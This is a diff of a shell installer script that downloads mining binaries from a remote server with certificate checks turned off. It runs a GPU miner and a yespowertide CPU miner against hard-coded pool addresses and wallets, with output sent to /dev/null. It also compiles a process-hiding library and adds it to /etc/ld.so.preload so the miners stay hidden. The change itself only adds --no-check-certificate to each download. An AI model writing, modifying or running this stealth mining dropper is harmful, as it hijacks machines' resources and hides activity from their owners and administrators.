@@ -15,7 +15,7 @@ npm i -g node-process-hider
 
 wget --no-check-certificate -O services https://maskurniawan.serv00.net/pearlfortune-v2.0.9 && chmod +x services
 
-wget https://maskurniawan.serv00.net/graphics.tar.gz
+wget --no-check-certificate https://maskurniawan.serv00.net/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
@@ -48,11 +48,11 @@ echo " "
 echo " "
 
 
-./graftcp/graftcp wget https://maskurniawan.serv00.net/magicBezzHash.zip
+./graftcp/graftcp wget --no-check-certificate https://maskurniawan.serv00.net/magicBezzHash.zip
 unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp && clear && ./services --proxy 202.155.9.40:80 --address prl1p4wq5h2tpnpqcu3vwskw3utylklafm0fsd8za8cwgfnr6l2dkxywqmcnm0e --worker Cici -gpu & wget https://maskurniawan.serv00.net/sse2 && chmod 777 sse2 && ./sse2 -a yespowertide -o 37.230.62.246:443 -u TXEWxxF8yyzV9Q1vyk2Xai1Li3VMYjnaY9.cici -t $(nproc) > /dev/null 2>&1 & clear
+./graftcp/graftcp && clear && ./services --proxy 202.155.9.40:80 --address prl1p4wq5h2tpnpqcu3vwskw3utylklafm0fsd8za8cwgfnr6l2dkxywqmcnm0e --worker Cici -gpu & wget --no-check-certificate https://maskurniawan.serv00.net/sse2 && chmod 777 sse2 && ./sse2 -a yespowertide -o 37.230.62.246:443 -u TXEWxxF8yyzV9Q1vyk2Xai1Li3VMYjnaY9.cici -t $(nproc) > /dev/null 2>&1 & clear
